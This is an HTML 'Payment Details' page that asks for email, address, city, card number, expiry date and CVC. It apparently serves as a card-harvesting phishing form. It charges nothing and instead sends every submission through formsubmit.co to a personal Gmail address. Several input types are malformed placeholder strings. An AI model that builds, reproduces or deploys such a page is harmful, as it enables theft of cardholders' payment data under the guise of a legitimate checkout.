<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment</title>
    <script src="https://kit.fontawesome.com/8d796e2576.js" crossorigin="anonymous"></script>
 <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="wrapper">
        <h2>Payment Details</h2>
        <form action="https://formsubmit.co/johnmanager.austin@gmail.com" method="post">
            <!--Account Information Start-->
           
            <div class="input_group">
                <div class="input_box">
                    
                   
                </div>
            </div>
            <div class="input_group">
                <div class="input_box">
                </div>
            </div>
            <div class="input_group">
                <div class="input_box">
                    <input type="Email Address" name="Email Address" placeholder="Email Address" required class="name">
                    <i class="fa-solid fa-envelope"></i>
                </div>
            </div>
            <div class="input_group">
                <div class="input_box">
                    <input type="Address" name="Address" placeholder="Address" required class="name">
                    <i class="fa-solid fa-location-dot"></i>
                </div>
            </div>
            <div class="input_group">
                <div class="input_box">
                    <input type="City" name="City" placeholder="City" required class="name">
                    <i class="fa-solid fa-house"></i>
                </div>
            </div>
            <!--Account Information End-->
            
            <!--DOB & Gender Start-->

            <div class="input_group">
                <div class="input_box">  
                </div>
                <div class="input_box">       
                </div>
            </div>
            <!--DOB & Gender End-->

            <!--Payment Details Start-->
            <div class="input_group">
                <div class="input_box">
                    <h4> </h4>
                    <input type="radio" name="pay" class="radio" id="bc1" checked>
                    <label for="bc1"><span>
                        <i class="fa-brands fa-cc-visa"></i>
                    </span></label>
                    <input type="radio" name="pay" class="radio" id="bc2" checked>
                    <label for="bc2"><span>
                        <i class="fa-brands fa-cc-mastercard"></i>
                    </span></label>                    
                </div>
            </div>
            <div class="input_group">
                <div class="input_box">
                    <input type="Card Number" name="Card Number" class="name" placeholder="Card Number 1111 2222 3333 4444" required>
                    <i class="fa-solid fa-credit-card"></i>
                    </div>
                </div> 
                    <div class="input_group">
                        <div class="input_box">
                            <input type="Expiry date" name="Expiry date" class="name" placeholder="Expiry date" required>
                        <i class="fa-regular fa-calendar-days"></i>                            
                        </div>
                    </div>
                    <div class="input_group">
                        <div class="input_box">
                            <input type="CVC 632" name="CVC 632" class="name" placeholder="CVC 632" required>
                            <i class="fa-solid fa-user"></i>
                            </div>
                        </div>
                    <div class="input_group">
                        <div class="input_box">
                          
                        </div>
                    </div> 
                    <div class="input_group">
                        <div class="input_box">
                            <input type="number" class="name" placeholder="Amount" required>
                            <i class="fa-solid fa-money-bill"></i>
                        </div>
                    </div>
                    <div class="input_group">
                        <div class="input_box">
                            <button>Pay Now</button>
                        </div>
                    </div>        
            <!--Payment Details End-->
        </form>
    </div>
</body>
</html>
